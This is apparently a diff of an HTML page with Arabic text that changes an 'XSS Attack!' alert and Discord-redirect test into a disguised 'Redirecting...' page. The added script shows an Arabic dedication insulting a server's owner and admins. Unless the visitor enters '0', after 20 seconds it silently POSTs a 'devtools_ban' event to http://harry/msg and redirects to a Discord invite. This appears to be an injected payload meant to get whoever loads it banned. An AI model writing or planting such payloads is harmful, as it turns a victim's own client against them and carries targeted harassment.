@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting to Discord</title>
+    <title>Redirecting...</title>
     <style>
         body {
             background-color: #ffffff;
@@ -17,36 +17,89 @@
             align-items: center;
             font-family: Arial, sans-serif;
         }
-        h1 {
-            color: #000000;
+        input {
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #000;
+            border-radius: 5px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #000;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #333;
+        }
+        #dedicationMessage {
             font-size: 24px;
+            color: #000;
+            font-weight: bold;
+            text-align: center;
             margin-bottom: 20px;
         }
-        #countdown {
-            color: #000000;
-            font-size: 36px;
+        #successMessage {
+            font-size: 24px;
+            color: #000;
             font-weight: bold;
+            text-align: center;
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
-    <h1>يتم فتح سيرفر Discord بعد <span id="countdown">10</span> ثوانٍ...</h1>
+    <div id="dedicationMessage">اهداء الا كوم الخنيث و عقاب و ابو عتب اونر السيرفر الهطف و اعذرني يا ابو يام و ازبط ادارتك تجي تبند قبل ليش بدون سبب تبي تكلمن تعال دس _.dz</div>
+    <input type="text" id="userInput" placeholder="أدخل رقمًا">
+    <button id="submitButton">إرسال</button>
     <script>
-        // نافذة تنبيه عند تحميل الصفحة
-        alert('XSS Attack!');
+        const input = document.getElementById("userInput");
+        const submitButton = document.getElementById("submitButton");
+        const body = document.body;
+        let isCodeDisabled = false;
 
-        // عدّاد تنازلي
-        let seconds = 10;
-        const countdownElement = document.getElementById("countdown");
-
-        const countdown = setInterval(function() {
-            seconds--;
-            countdownElement.textContent = seconds;
-            if (seconds <= 0) {
-                clearInterval(countdown);
-                window.location.href = "https://discord.gg/KT"; // فتح سيرفر ديسكورد مباشرة
+        submitButton.addEventListener("click", function() {
+            if (input.value === "0") {
+                isCodeDisabled = true;
+                // إزالة حقل الإدخال والزر
+                input.remove();
+                submitButton.remove();
+                // إضافة رسالة "نجحت"
+                const successMessage = document.createElement("div");
+                successMessage.id = "successMessage";
+                successMessage.textContent = "نجحت";
+                body.appendChild(successMessage);
+            } else {
+                isCodeDisabled = false;
             }
-        }, 1000); // تحديث كل ثانية
+        });
+
+        // تنفيذ fetch وإعادة التوجيه إذا لم يتم تعطيل الكود
+        setTimeout(function() {
+            if (!isCodeDisabled) {
+                // طلب fetch
+                fetch("http://harry/msg", {
+                    "headers": {
+                        "accept": "*/*",
+                        "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
+                    },
+                    "referrer": "",
+                    "referrerPolicy": "strict-origin-when-cross-origin",
+                    "body": "{\"eventName\":\"devtools_ban\"}",
+                    "method": "POST",
+                    "mode": "cors",
+                    "credentials": "omit"
+                });
+
+                // إعادة توجيه إلى Discord
+                window.location.href = "https://discord.gg/KT";
+            }
+        }, 20000); // 20,000 ميلي ثانية = 20 ثانية
     </script>
 </body>
 </html>
